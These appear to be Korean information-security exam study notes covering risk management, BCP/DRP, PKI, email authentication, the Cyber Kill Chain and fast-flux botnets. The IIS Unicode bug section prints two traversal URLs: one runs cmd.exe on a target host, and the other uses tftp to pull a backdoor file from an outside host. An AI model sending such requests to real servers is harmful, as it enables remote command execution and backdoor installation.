- IT거버넌스란 IT와 IT프로세스의 위험과 수익 사이에 균형을 맞추면서 가치를 창출하여 기업의 목적을 달성하기 위한 기업 통제의 관계구조 및 프로세스

IT거버넌스에 연계된 정보보호 거버넌스에서의 이사회 역할은 정보보호 거버넌스의 최종적인 책임을 지는 것이며, 경영진의 역할은 이사회와 더불어 정보보호 거버넌스를 구현하는데 중요한 책임을 진다.

<br>

- CERT(침해사고대응팀) 대응 방법 7단계   
: 사고 전 준비과정 ->사고탐지 -> 초기대응 -> 대응 전략 체계화 -> 사고조사 -> 보고서 작성 -> 해결    

<br>

- 가명처리 순서   
: 사전준비 -> 가명처리 -> 적정성 검토 및 추가조치 -> 사후 관리 

<br>

- ISO Risk Assessment   
:위험식별 -> 위험분석 -> 위험평가 

<br>

- 위험 구성요소   

: 위협, 자산, 보호대책, 취약성     
> 위험 = 위협 * 자산 * 취약성 - 보호대책    

<br>

- 위험 처리   

: 잔여 위험을 대상으로 적절하고 정당한 대응 등을 식별 • 선정하는 일련의 과정   
> 위험 수용, 위험 전가, 위험 감소, 위험 회피 

<br>

- 수용가능한 위험 DoA   

ㅁ 위험 분석    
: 위험을 해석하는 과정으로 조직 자산의 취약점을 식별하고 발생 가능한 위험의 내용과 정도 등을 결정하는 일련의 과정    
자산 목록에 기반해 정보 보호 비용을 산출하는 일련의 과정   

- 기준 접근법    
- 비정형 접근법      
- 상세위험 접근법     
- 통합 접근법     


<br>

ㅁ 위험 평가    
: 조직에서 필요한 정보 보호 요구 사항 등을 분석하기 위해 정보나 정보 처리 기기에 대한 위험의 종류 • 영향 • 발생 가능성 등을 평가하는 일련의 과정
산출한 정보 보호 비용에다 우선 순위를 부여해 적절한 대책을 결정하는 일련의 과정 기본통제접근법

- 상세위험 접근법
 
  - 정량적 분석: ALE, 과거자료법, 수학공식법, 확률 분포법
  - 정성적 분석: 델파이법, 시나리오법, 순위결정법 

> 자산 가치(AV), 노출 계수(EF), 연간 발생률(ARO)   
> 단일 손실 예상액(SLE) : 자산 가치(AV) * 노출 계수(EF)   
> 연간 손실 예상액(ALE) :단일 손실 예상액(SLE) * 연간 발생률(ARO)   

<br>

ㅁ 사업 연속성 계획(BCP) 개념      
: 정보 보호 정책의 일부이며, 경영진의 지원이 핵심     
재난이 발생할 경우 최악의 시나리오를 염두에 두고 사업의 연속성을 유지하는 방법을 정의한 문서로 핵심 업무의 재개를 목표로 전사적인 차원에서 수립 가용성 유지가 관건   

<br>

ㅁ 사업 영향 분석(BIA) 개념    
:재난 발생을 고려해 위험 분석 등을 실시하는데 이 경우 발생 가능한 모든 재해를 고려해 잠재적인 손실을 측정하고 재난을 분류한 뒤 복구 대상의 우선 순위를 부여해 실행 가능 한 대안을 개발하는 일련의 과정

<br>

ㅁ 사업 영향 분석(BIA) 접근 5단계 과정 

1. 주요 업무 과정의 식별     
2. 재해 유형과 가능성의 식별     
3. 재해 시 업무 진행 중단에 따른 손실 평가       
4. 복구 대상의 우선 순위와 범위 설정       
5. 주요 업무 진행별 복구 목표 시간 설정   

<br>

ㅁ 재난 복구 계획(DRP) 개념   
: 사업 연속성 계획(BCP)의 일부로서, 재난이 발생할 경우 기술적 측면에서 핵심 장비의 연속성을 유지하도록 정의한 문서

<br>

- BCP와 DRP의 비교   

BCP는 심각한 실패나 재해로 인해 사업활동이나 프로세스가 중단되는 것에 대항
 
DRP는 심각한 실패나 재해의 영향으로 인해 핵심 정보시스템과 데이터가 중단되는것에 대항

<br>

ㅁ 재난 복구 서비스 종류

- 미러 사이트   
- 콜드 사이트   
- 핫 사이트    
- 웜 사이트

<br>


- 디지털 포렌식 5대 원칙 

> 1) 정당성 : 입수한 증거는 적법한 절차에 따라 수집된 것이어야 함. 위법한 절차(스니핑, 도청 등)를 거쳐 획득한 증거는 증거로서의 효력이 없음.    
> 2) 재현성 : 획득한 증거는 동일한 조건에서 동일한 결과가 나와야 함. 수행할 때마다 다른 결과가 나온다면 증거로서의 효력이 없음(예: 시스템에서 삭제된 파일을 복구하는 경우)     
> 3) 신속성 : 사건 발생 시 즉각적으로 신속히 대응 및 진행되어야 함. 특히 메모리에만 남아 있는 휘발성 정보(예:실행 중인 프로세스)는 대응이 지연되는 경우 적시에 확보하지 못할 가능성이 높아짐.    
> 4) 연계보관성 : 증거의 수집, 이동, 분석, 보관, 제출의 각 단계가 명확한 책임하에 연계되어야 함. 각 단계별로 관여한 담당자, 책임자를 명시하는 것이 중요하며, 이를 통하여 포렌식 과정에서 문제 발생 시 추적이 가능함.    
> 5) 무결성 : 수집한 증거가 위/변조되지 않고, 원본과 동일함을 증명할 수 있어야 함(예: 하드디스크 이미지 Hash 값). 포렌식 각 단계별로 무결성이 유지되고 있는지 매번 확인하는 것이 중요함   



<br>

- 전자서명 요구 조건   
1. 서명자 인증: 전자서명을 생성한 서명인을 검증 하는 기능
2. 부인방지: 서명인은 자신이 서명한 사실을 부인 불가
3. 위조불가: 서명인의 개인키가 없으면 서명을 위조하는것은 불가
4. 변경불가: 이미 한 서명을 변경하는 것이 불가
5. 재사용불가: 한 문서의 서명을 다른 문서의 서명으로 재사용 불가
6. 재생 방지: 메세지를 유일하게 하기 위해 연속번호 또는 타임스탬프를 포함시킨다면 수신자가 검사하여 메세지가 탈취 되거나 재생되지 않았음을 보장할수 있음


- IKE(Internet Key Exchange)
: 인터넷 표준 암호 키 교환 프로토콜, IPsec을 암호화하는데 사용한다.   
IKE는 송신측에서 수신측이 생성한 암호 키를 상대방에게 안전하게 송신하는 위한 방법이다.   
RSA법과 디피헬먼법등의 암호기술을 사용한다.   
IKE는 IPSEC에서 사용하는 키 교환 프로토콜

<br>

- 커버로스(Kerberos)
: 티켓 발급 서버(TGS: Ticket Granting Server)를 사용, TTP(Trusted Third Party) 방식이다.   
TGS에서 발급받은 티켓을 사용하여 서버 인증을 하며 대칭키 암호 방식을 사용.   
키 분배 센터를 통해 메시지 인증을 할수 있으므로 MITM 공격 불가능.   
데이터의 기밀성과 무결성 보장 / 패스워드 추측 공격에 취약, 사용자가 패스워드 바꾸면 비밀키도 변경해야하는 번거러움

<br>

- 대칭키 알고리즘: DES, 3DES, AES, IDEA, Blow< SEED

- 공개키 알고리즘: RSA, Rabin, ECC, ElGamal 

<br>

- PKI(Public Key Infrastructure) : 공개키 암호화 기반을 둔 인증서 (PKI: CA, CRL, RA )

:전자서명에서 서명 검증을 할 때 이용하는 공개키가 진짜 송진자의 공개키여야 한다. 

이 때문에 고안된 것이 공개키를 메시지로 간주하고, 신뢰 가능한 다른 사람에게 전자서명을 해서 받는 인증서다. 

공개키 암호 및 전자서명의 기술 즉, 공개키 암호화에 기반을 만들어 가는 것이 PKI다.


PKI 구성요소 ] 인증기관(CA : Certication Authority), 인증정책 수립 및 인증서 폐기목록 관리, 정책 승인기관(PAA : Policy Approving Authority), 정책 인증기관(PCA, Policy Certification Authority), 검증기관(VA : Validation Authority), 인증서의 유효성 확인, 사용자와 최종 개체(subjects and end entities), 등록기관(RA : Registration Authority), 저장소(Repository)

- CA(인증기관): 인증 정책 수립, 인증서 및 인증서 폐기 목록을 관리, 공개키 인증서를 자신의 개인키로 서명, 공개키와 개인키 쌍의 소유자 신분을 증명, 다른 CA와 상호 인증, CRL 등록 및 인증 절차 작성

- RA(등록기관): 사용자 신원 확인, 인증서 요구를 승인, CA에 인증서 발급을 요청, 디지털 인증서 신청자의 식별과 인증을 책임, PKI이용하는 Application과 CA 간 인터페이스 제공, 대표적 RA는 은행, 증권사

- CRL(Certificate Revocation List)
: PKI 구성요소 중 하나, 인증서 폐기 목록, 인증서의 지속적인 유효함을 점검하는 도구, 폐지사유,    
 OCSP: 인증서 상태에 관한 정보를 조회 또는 CRL 검색 프로토콜

<br>

- 생채인증
  - 존재 특징: 생채특성, 지문, 장문, 얼굴, 손 모양, 홍채, 망막, 정맥      
  - 행동 특징: 서명, 음성, 키보드 입력


<br>  

- 해시 알고리즘의 조건
  - 압축: 임의의 길이의 평문을 고정된 길이의 출력 값으로 변환      
  - 일방향: 메세지에서 해시값(Hash code) 구하는 것은 쉽지만 반대로 해시값에서 원래의 메세지를 구하는 것은 더욱 어려움     
  - 효율성: 많은 자원과 노력이 소요되지 않아야 한다.     
  - 충돌회피: 충돌(Collisition Free) 다른 문장을 사용하였는데도 동일한 암호문이 나오는 현상.     



<br>
<br>

- 무선랜 통신 암호화 방식

1. WEP(Wired Equivalent Privacy)

: WEP는 무선 랜 통신을 암호화하는 가장 기본적인 방법으로 802.11b 프로토콜부터 적용되었다.

64bit, 128bit 암호화방식을 사용하는데 기본적으로 RC4 알고리즘을 사용한다.

암호화 키는 64bit는 40bit, 128bit는 104bit의 RC4 키와 함께 무작위로 산출된 24bit의 초기화 벡터가 사용된다.

클라이언트에서 ap인증을 요청하면, ap는 무작위로 초기화벡터를 생성하고, 클라이언트는 WEP 키로 암호화하여 AP로 전송한다.

AP는 전달받은 암호문을 WEP 키로 복호화하여 본인이 최초 전송한 초기화 벡터와 일치하면 연결을 허락한다.

하지만, 짧은 초기화 벡터로 인해 패킷 내 초기화 벡터를 충분히 수집 후 크랙할 경우 1분이내에 복호화가 가능하다.

<br>

2. WPA(Wi-Fi Protected Access), WPA-PSK

WPA는 와이파이 보호접속(Wi-Fi Protected Access) 라고도 한다.

WPA는 TKIP(Temporal Key Integrity Protocal) 알고리즘을 사용한다. TKIP는 기본적으로 WEP와 같은 RC4 키 스트림 암호화 알고리즘을 사용한다.

또한, WPA2는 RC4알고리즘 대신 AES 암호화 알고리즘을 사용하여 더 강력한 보안을 제공한다.

WPA의 경우 WEP와는 달리 단순한 패킷 수집을 통해서 크랙이 이루어 지지 않는다.

WPA-EAP로 불리는 WPA Enterprise 방식은 인증 및 암호화를 강화하기 위해 다양한 보안 표준 및 알고리즘을 채택했다.

그중 핵심적인 사항은 유선 랜 환경에서 포트 기반 인증 표준으로 사용되는 IEEE 802.1x 표준과 함께, 다양한 인증 메카니즘을 수용할 수 있도록 IETF의 EAP인증 프로토콜을 채택한 것이다.

```
국제 인터넷 표준화 기구(Internet Engineering Task Force, IETF)

: 인터넷의 운영, 관리, 개발에 대해 협의하고 프로토콜과 구조적인 사안들을 분석하는 인터넷 표준화 작업기구이다.
```

<br>

- 무선랜 인증방식: EAP, PSK 
> - EAP(Extensible Authentication Protocol): 유선망에서 PPP 절차에 의한 사용자 인증을 위하여 개발, 모든 계층에 적용, 다양한 인증방법 사용 가능, 단말과 인증서버간 인증 프로토콜에 관여하지 않는 인증 메커니즘   
> - PSK(Pre Shared Key): 인증서버 없이 단말기와 AP 간 미리 공유한 키를 기반으로 AP 접속을 인증한다.   
personalmode 와 enterprisemode로 운영    
Layer 2 동작, 강력한 네트워크 접근 정책 구현이 가능 Port Control을 통한 비인가된 사용자들은 네트워크 접속이 차단.

- 무선랜 보안 방식: WEP, WPA, WPA2, IEEE 802 11i 

- XML: SOAP, WSDL, UDDI   
> - SOAP(Simple Object Access Protol): 웹 서비스 호출, 그 결과를 전달받을 떄 사용되는 메세지 프르토콜   
> - WSDL(Web Service Description Language): 해당 서비스에 대한 상세한 설명이 되어있는 서비스 기술서   
> - UDDI(Universal Dscription Discovery and Integration): 웹 서비스를 등록하고 검색할수 있는 일종의 레지스트리와 관련된 표준   


- NAT:사설 IP 를 라우팅 될 수 있는 공인 IP로 변경하는 주소변환 

- EFS: 윈도우즈 2000 운영체계에서 파일이나 폴더가 암호형태로 저장되고 개인사용자와 이나된 검색 에이전트만 해독할수이는 암호화기법 

- NTFS: 파일 암호화 및 파일 레벨 보안 지원, 디스크 압축 및 파티션 단위는 쿼터. FAT 16 or 32로 변환 - 불과, 사용되는 운영체제 윈도우 , 2000, XP 

- SSL: change cipher spec protocol, alert protocol, record protocol

[SSL과 TLS](https://github.com/sungmin4036/infomation_security/blob/main/etc/SSL%EA%B3%BC%20TLS.md)

- DOI(Ditital Object Identifier)
: 디지털 콘텐츠에 대해 고유한 식별기호를 부여하고 이를 URL로 변환하여 인터넷상의 해당 정보 위치에 접근할 수 있는 표준 체계

- WTLS란 무엇인가요?

: WTLS는 IETF의 TLS(Transport Layer Security)프로토콜(기존에는 SSL이라 불렀다)을 기반으로 한 무선환경에 적합하도록 개발된 보안 프로토콜이다.

TLS가 서버 및 클라이언트 인증을 위하여 X.509 인증서를 사용한데 반하여 

WTLS는 인증서 규격을 X.509 인증서, WTLS 인증서, X9.68 인증서 등을 정의하고 있다. WTLS는 UDP/IP를 적용하였으며 단말의 성능을 고려하여 여러 가지 관련 파라미터의 길이를 줄였다.

WDP(Wireless Datagram Protocol)와 WTP(Wireless Transaction Protocol) 사이에 위치하고 있으며, SSL과 마찬가지로 응용의 필요에 따라 선택적으로 사용된다.     

WTLS가 SSL과 크게 다른 점은 SSL이 연결형 프로토콜인 TCP 위에서 동작하는 반면에,   

WTLS는 비연결형 프로토콜인 WDP 또는 UDP 위에서 동작한다는 것이다. 따라서 WTLS에서 자체적으로 생성한 패킷에 대해서는 WTLS에서 자체적으로 신뢰성을 고려해야 한다. 


<br>

- ESM(Enterprise Security Management)   
: 방화벽, 침입 탐지 시스템, 침입 방지 시스템 등 각종 보안 시스템의 로그들을 모아 한곳에서 통합 관리를 할 수 있게 해주는 시스템   
> Agent : 보안 장비에 탑재되어 수집된 데이터를 Manager 서버에 전달하고 통제를 받음   
> Manager : Agent로부터 받은 이벤트를 분석·저장 후 Console로 그 내용을 통보   
> Console : Manager로부터 받은 데이터의 시각적 전달, 상황 판단 기능, 관리 서버의 룰을 설정하도록 지휘·통제    
> Repository : 보안 장비별 구성 정보의 통합 데이터베이스 관리   
> Protocol: 원격 관리를 위한 SNMP, ICMP 등의 프로토콜    


- 리눅스 비밀번호 관리 파일   
> 1. /etc/default/useradd   
> 2. /etc/skel   
> 3. /etc/login.defs : 패스워드 최소, 최대 사용일, 패스워도 최소길이, 사용자 계정의 범위, 홈 디렉터리여부, Umask값 설정, 계정 삭제시 그룹 삭제여부, 암호화 기법, 기본 메일 디렉터리   


- CVE(Common Vulnerabilities and Exposures)
: CVE는 공개적으로 알려진 보안취약점에 대한 공통 식별자 목록으로, 표준화된 CVE 항목은 서비스 적용 범위를 평가할 수 있는 기준을 제공한다.

CVE는 다음과 같은 규칙으로 만들어진다.   
> CVE - (연도) - (순서)

- CWE(Common Weakness Enumeration)    
: 소프트웨어 취약점 목록으로, 소스코드 취약점을 정의한 데이터베이스이다.

- CCE(common configuration enumeration)   
: 시스템의 취약한 설정에 대한 점검이다.

- CVSS(Common Vulnerability Scoring System)   
: CVSS는 공통 취약점 등급 시스템으로 해석할 수 있으며, 취약점 위험도를 계산할 수 있는 개방형 프레임워크이다.    

취약점의 위험도 평가를 위해 취약점의 접근 경로, 복잡성, 인증 여부, 사용자 인터페이스, 기밀성, 무결성, 가용성 등 여러 항목을 사용한다.   

CVSS는 Mitre에서 발표하였지만, 취약점과 연동하여 점수를 계산할 수 있는 사이트는 NIST(National Institute of Standards and Technology)에서 관리하고 있는 NVD에서 제공하고 있다.

- 사이버 킬 체인(Cyber Kill Chain)   
: 사이버 공격을 프로세스 기반 분석하여 각 단계 별 위협 요소 파악 및 공격 방법 정의 분석 모델
> 사이버 킬 체인의 사상   
:‘공격이 최선의 방어’라는 전투 원칙 사상을 응용  \#(APT 공격을 설명하는데 주로 사용)

![image](https://user-images.githubusercontent.com/62640332/136811525-b2f89ac1-95fe-4f8f-bb67-77fc9e897b35.png)

| 세부항목 | 내용 |
|---|---|
| 정찰 | 공격 목표와 표적 조사/식별/선정 |
| 무기화 | 자동화 도구 이용, 사이버 무기 준비 |
| 전달 | 표적시스템에 사이버 무기 유포 |
| 익스플로잇 | 사이버무기의 작동 촉발/악용 |
| 설치 | 표적시스템에 악성 프로그램 설치 |
| C&C | 표적시스템 원격조작 채널 구축 |
| 행동개시 | 정보수집/시스템 파괴 등 공격 수행 |



<br>

- SIEM
: SIEM이란 보안 정보 및 이벤트 관리를 의미하며 조직에 차세대 탐지, 분석 및 대응 방안을 제공합니다. 

SIEM 소프트웨어는 보안 정보 관리(SIM)와 보안 이벤트 관리(SEM)를 결합하여, 애플리케이션 및 네트워크 하드웨어에 의해 생성되는 보안 경보에 대한 실시간 분석을 제공합니다. 

SIEM 소프트웨어는 이벤트를 규칙 및 분석 엔진과 대조하며, 전 세계에서 수집된 인텔리전스를 이용하여 1초 이내의 빠른 검색으로 지능형 위협을 탐지 및 분석할 수 있도록 이벤트를 인덱싱합니다. 

데이터 분석, 이벤트 상관관계, 데이터 수집, 리포팅 및 로그 관리를 제공함으로써 보안 팀들은 해당 IT 환경에서 일어나는 활동에 대한 인사이트를 가질 수 있고 과거 활동을 추적할 수 있는 기록 정보가 확인 가능합니다.

<br>
<br>

- 인터넷 정보 서비스(Internet Information Services, IIS)는 마이크로소프트 윈도우에서 사용 가능한 웹 서버 소프트웨어이다. 흔히 IIS라는 약칭으로 많이 불린다. 윈도우에서는 NT 커널을 사용하는 모든 버전에서 무료로 제공한다. 

- IIS UNICODE BUG
: 타겟호스트에 스크립트 폴더를 이용하여 유니코드 문자열을 통해 cmd.exe이 사용 가능하다.

> http://target_host/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+dir

아래는 tftp(udp 69번)프로토콜을 통해 지금이라면 RAT와 같은 백도어를 업로드 하는 명령어다.

> http://target_host/scripts/..%255c..%255cwinnt/system32/cmd.exe?/c+ tftp+-i+tftp_host+get+"upload_file


![image](https://user-images.githubusercontent.com/62640332/136793804-0e1359da-5797-4e1e-8e96-4709dcc5dc27.png)

![image](https://user-images.githubusercontent.com/62640332/136793895-76530d5a-ccc9-4417-b500-92e931bb0de7.png)

![image](https://user-images.githubusercontent.com/62640332/136793960-1f947307-ad12-40f8-bb8d-4a16874035cc.png)


<br>

- VTP(VLAN Trunking Protocol)   
: 복수 개의 스위치 간에 VLAN의 설정 정보를 교환해 주는 프로토콜, VLAN 설정의 편의성을 향상된다.

<br>

- 메모리 구조
  > - stack: 지역변수, 매개변수
  > - heap: 동적할당
  > - code: 프로그램 코드
  > - data: 전역변수, 정적변수
<br>

- 리눅스 점검 도구
    > - SAINT: 유닉스 시스템에서 작동하는 네트워크 취약점 분석도구, HTML 형식의 보고서 기능, 원격 취약점 점검 기능    
    > - SARA: SATAN을 기반 취약점 분석 도구, 유닉스 시스템에서 작동, 네트워크 기반 장비에 대해 취약점 분석 가능, HTML 형식의 보고서 가능
    > - COPS: 유닉스 시스템에서 동작하는 시스템 취약성 점검 도구, 시스템 내부의 취약점 검사 기능
    > - Nessus: 유닉스 시스템 동작하는 네트워크 취약점 점검 도구, 클라이언트/서버 구조
    > - NMAP: 대표적인 포트 스캐닝 도구, Tcp connection으로 스캔뿐만 아니라, 다양한 스텔스 모드로 스캔이 가능, 하나의 호스트 뿐만 아니라 거대 네트워크의 고속 스캔도 가능


- TTL 값을 통한 OS 식별

|TTL|OS|
|---------|---------|
|31|Firmware|
|64|Linux|
|128|Windows|
|247|Solaris 2.X|
|248|Unix 4.0|
|255|Cisco Router|

<br>

- Sandbox

: 보호된 영역 내에서 프로그램을 동작시키는 것으로, 외부 요인에 의해 악영향이 미치는 것을 방지하는 보안 모델   

아이를 놀리는 모래밭(샌드 박스)에서 유래된 말이다.   

외부로부터 받은 프로그램을 보호된 영역, 안에 가두고 나서 동작시킨다.   

보호된 영역은 다른 파일이나 프로세스로부터는 격리되어 내부에서 외부를 조작하는 것은 금지된다.   

<br>

- PAM(Privileged Access Management)   
: 공유 라이브러리를 사용하여 응용 프로그램이 어떤 방법으로 사용자를 인증할 것인지 설정, 일반적으로 서비스 인증 부분에 접근 통제를 설정   

특정한 사용자, 시간, 장소에서만 로그인 할수 있도록 설정가능. 

인가된 액세스 관리, 애플리케이션 제어 및 엔드포인트 권한 보안을 통해 사이버 공격의 리스크를 줄이고 디지털 비즈니스를 보호합니다.

<br>

- UAC(User Access control)   

: 윈도우 비스타에서 컴퓨터 시스템 무단 변경을 방지하는 보안기능. 하나의 컴퓨터에서 여러사람의 사용이나 특정 작업인 프린터 및 드라이버 설정등을 지정할수 있는 기능 제공 

- BIt Lock   

: 기업 데이터 보호정책을 강화하고, 휴지 상태의 데이터를 안전하게 보호하여 조직의 점차 엄격해지고 법적 요구사항을 준수할수 있도록 도와준다.

 마이크로소프트 윈도우 비스타, 윈도우 서버 2008, 윈도우 7, 윈도우 8, 윈도우 8.1, 윈도우 10 운영 체제에 포함된 완전한 디스크 암호화 기능이다. 
 
 볼륨 전체에 암호화를 제공함으로써 자료를 보호하도록 설계되어 있다. 기본적으로 이것은 128비트 키의 CBC 모드에서 AES 암호화 알고리즘을 사용한다.[1]

<br>

- 교착상태 발생 조건: 상호배제, 점유와 대기, 비선점, 환형대기

<br>

- UTM: 하나의 어플리케이션 장비에 여러가지 보안 기능 솔루션 탑재 

<br>

- 접근통제: MAC, DAC, RBAC 

<br>

- IPsec: AH, ESP 

<br>

- WAP: 모바일에서 인터넷 접속시 사용되는 프로토콜 

<br>

- SSO: 다수의 서버 한번의 로그인으로 기업업무 시스템이나 인터넷서비스에 접근가능 

<br>

- Null Routing 필터링: blackhole 필터링 이라고도 불림, 특정 IP를 필터링 할때 가상의 인터페이스로 보내는 방법    

￦# -> null routing filtering 되면 ICMP  Unreachable신호를 전송하지 않는다. 

<br>

- Tripwire
 
: 리눅스 무결성 점검 프로그램.   

시스템의 파일에 대한 Check sum을 데이터베이스화 하여 파일에 대한 변경여부를 판단 가능.   

공격자가 임의적으로 파일 변조시 변조된 파일 파악하기 위해 사용     



<br>

- 메일서버 인터넷 표준 프로토콜: SMTP(25), POP3(110), IMAP4(143), IMAP3(220) 

<br>

- 전자우편 암호화 프로토콜: PGP, PEM, S/MIME 



<br>

- PEM(Privacy Enhanced Mail)
: 중앙집중화 된 키 인증 방식, 구현이 어렵고, 높은 보안성을 제공, 전자우편 전송시 전 자동으로 암호화

<br>

- S/MIME(Secure/Multipurpse Internet Mail Extenstion)

  - RSA, DSA, Diffie-Helman 공개키 암호화   
  - 3DES, RC4, IDEA, DES, RC2 대칭 암호화    
  - X509 ver3 인증서 지원    
  - 공개키 기반 구조(PKI) 인증서 사용   
  - PEM 구현의 복장성, PGP의 낮은 보안성과 기존 시스템과의 통합이 용이하지 않다는점을 보안위해    
  - RSADSI(RSA Data Security Incorporation)의 기술을 기반으로 개발된 전자우편 보안 시스템

<br>

- SMTP(Simple Mail Transfer Protocol)
  - MTA(Mail Transfer Agent): 메일을 전송하는 서버    
  - MUA(Mail User Agent): 사용자들이 사용하는 클라이언트 애플리케이션    
  - MDA(Mail Delivery Agent): 수신 측에 고용된 우체부 역할, MTA에게 받은 메일을 사용자에게 전달한다.   
  - MRA(Mail Retrieval Agent)    
  - MSA(Mail Submission Agent)  


<br>

- Zone Transfer
: 네임서버의 Master 와 Slave 간에 또는 Primary와 Secondary DNS간에 Zone 파일을 동기화하기 위한 용도로 사용되는 기술. SLAVE 서버는 정기적으로 Master 서버에 접속을 시도해 zone 파일의 시리얼을 서로 비교해 보고 상황에 따라 Zone 파일을 전송합니다. 별도의 설정을 하지 않는 경우 기본적으로 모든 IP에 대해 허용


- 메일 보안 기술: spamassassin, Inflex, sanitizer, RBL, SPF, procmail,  DMARC, DKIM


<br>

- spamassassin
: Perl에서 작성된 라이브러리와 SpamAssassin을 메시징 시스템에 통합하는 데 사용될 수 있는 일련의 응용 프로그램과 유틸리티로 구성됩니다.

SpamAssassin은 메일 헤더 및 본문 정보에 대한 일련의 테스트를 수행하여 모든 메시지에 대한 점수를 계산합니다. 

테스트가 성공하거나 실패할 때마다 true(스팸) 또는 false(스팸 아님) 답신이 렌더링됩니다. 

점수는 양의 실수 또는 음의 실수입니다. 점수가 특정 임계값(일반적으로 5.0)을 초과하면 스팸으로 간주됩니다.




<br>

- SPF
> TXT 레코드에 아래의 값을 추가합니다.
> 이름(호스트, 별칭): @ 또는 비워둠.
> TTL(수명): 3600 또는 기본값으로 둠.
> 값(응답, 대상): v=spf1 include:mail.stibee.com ~all
> 값(응답, 대상)에 2개 이상의 도메인을 입력하는 경우, 하나로 합쳐서 입력합니다. (예. v=spf1 include:sub.domain.com include:mail.stibee.com ~all)

<br>

- DKIM
> CNAME 레코드에 아래의 값을 추가합니다.
> 이름(호스트, 별칭): stb._domainkey.yourdomain.com 또는 stb._domainkey
> 값(응답 ,대상): dkim.stibee.com
> "이름(호스트, 별칭)"의 "yourdomain.com"은 발신자 이메일 주소의 도메인으로 대체합니다.
> 예를 들어, 발신자 이메일 주소가 "hello@stibee.com"이라면, "이름(호스트, 별칭)"은 "stb._domainkey.stibee.com" 또는 "stb._domainkey"로 입력합니다. "stb._domainkey"는 도메인과 상관없는 고정된 값입니다.

<br>

- DMARC(Domain-based Message Authentication, Reporting and Conformance)는 이메일 인증 프로토콜이다. 이메일 도메인 소유자가 이메일 스푸핑으로 알려진 무단 사용에서 도메인을 보호할 수 있도록 설계되었다. 
 
DMARC의 구현 목적은 비즈니스 이메일 공격, 피싱 이메일, 이메일 사기 등 사이버 위협 행위에 도메인이 이용되지 않게 보호한다.

DMARC DNS 레코드가 게시되면 수신 이메일 서버는 도메인 소유자가 게시한 정책에 따라 수신 이메일을 검사한다. 

이메일이 인증을 통과하면 전송되고 신뢰할 수 있다. 이메일이 검사에 통과하지 못하면 DMARC 레코드에 포함된 지침에 따라 이메일을 전송, 격리 또는 거부할 수 있다.

DMARC는 Sender Policy Framework(SPF)와 DomainKeys Identified Mail(DKIM) 두 가지 기존 메커니즘을 확장한다. 

도메인의 관리자는 DNS 레코드에 정책을 게시하여 해당 도메인에서 전자 메일을 보낼 때 어떤 메커니즘(DKIM, SPF 또는 둘 다)을 사용하는지 지정할 수 있다. 

최종 사용자에게 표시된 From: 필드를 확인하는 방법과 수신자가 실패를 처리하는 방법, 일일 보고서 전달 방식을 지정한다.

DMARC는 "Informational" 상태로 2015년 3월 12일자 RFC 7489 표준으로 정의한다.[1]


<br>

### fast-flux 기술을 이용한 악성 URL 은닉 방법

![image](https://user-images.githubusercontent.com/62640332/162381860-560cf287-8f4b-44bc-88af-d591a6a9bd60.png)

일반적으로 호스트들은 만약 정상적인 도메인(예를들어 www.innocentsite.com에 request 패킷을 전송하면, 당연히 innocentsite서버에서 reply 패킷이 올 것이라고 예상합니다. 

fast-flux는 특정 도메인에 대량의 IP주소를 제공하는 것을 가능하도록 합니다. TTL의 크기는 3~5정도이며, IP주소들은 라운드로빈 방식으로 빠르고 주기적으로 바뀌게 됩니다. 

라운드 로빈 DNS는 일종의 네트워크 부하 분산 및 네트워크 밸런싱에 사용되는 기술입니다. 

이 기술은 각기 다른 사용자가 동일한 도메인에 접속하도록 허용하며, 각기 다른 서버에서 전달되는 reply를 받을 수 있도록 허용합니다. 


예를들면, 사용자 1이 Google에 request를 전송하게되면, google-server1에서 reply 를 받게 되지만, 사용자 2가 동일하게 Google에 접속한다면 google-server2에서 reply를 받게 되는 것입니다.

매 호스트는 reply 패킷을 발송한다면, 해당 호스트의 ip는 리스트의 가장 하단으로 이동하기 때문에, 리스트 상단에는 항상 항상 부하가 제일 적은 호스트가 위치하게 됩니다. 

fast-flux 네트워크로 돌아가보면, 호스트들은 모두 감염된 PC이며, 악성 서버에 프록시 네트워크를 제공해 주기 위하여 봇넷을 생성합니다. 

위에 이미지를 보면, "mothership"서버는 감염 호스트들에게서 받은 request에 대한 reply를 담당하고 있는 것입니다. 

fast-flux는 single-flux와 double-flux로 구분할 수 있습니다. 

<br>

ㅁ Single-flux 네트워크

감염 호스트는 www.innocentsite.com에 request를 발송합니다. 하지만 해당 호스트의 트래픽은 봇넷으로 리다이렉션 되며, mothership에게 전송됩니다. 이 봇넷의 대부분은 감염된 개인 host로 구성되어 있습니다. 

리다이렉션 작업은 flux-agent 호스트에 의해 실현됩니다. flux-agent의 DNS는 매 3분에서 10분에 한번씩 갱신되기 때문에, 하나의 리다이렉션 호스트가 죽는다해도 빠른 시간내에 다른 노드로 전환이 가능한 것입니다. fast-flux 네트워크는 DNS와 HTTP 프로토콜을 이용한 서비스를 제공할 수 있을 뿐만 아니라, IMAP, SMTP 및 POP 프로토콜도 사용이 가능합니다. 

<br>

ㅁ Double-flux 네트워크

Double-flux 는 fast-flux의 더 복잡한 버전입니다. 왜냐하면 DNS의 A레코드와 NS레코드가 라운드 로빈 방식으로 변경되기 때문입니다.

어떤 권위있는 서버가 특정 DNS 영역을 처리하도록 DNS NS record를 설정하는 동안, DNS A 레코드는 32bit의 IPv4를 해당 ip에 연결되어 있는 호스트한테 반환합니다. 

이는 즉 doubleflux 기술을 이용하여 공격할 때, 호스트의 ip주소 변환은 단일의 DNS 명칭의 일부가 아닌, 전체 DNS 영역임을 뜻합니다.  

이렇기 때문에, Double-flux 공격의 근원지를 찾기가 매우 힘듭니다. 

기존에는 IRC 서버를 기반으로 봇넷을 운영했지만, IRC 컨트롤 서버만 발견하면 전체의 악성코드를 삭제할 수 있었습니다. 

하지만 fast-flux 기술로 봇넷을 구성한다면,수천~수만대의, 전 세계 각지에 위치해 있는 봇들을 무력화 시키는 방법 밖에 없습니다.


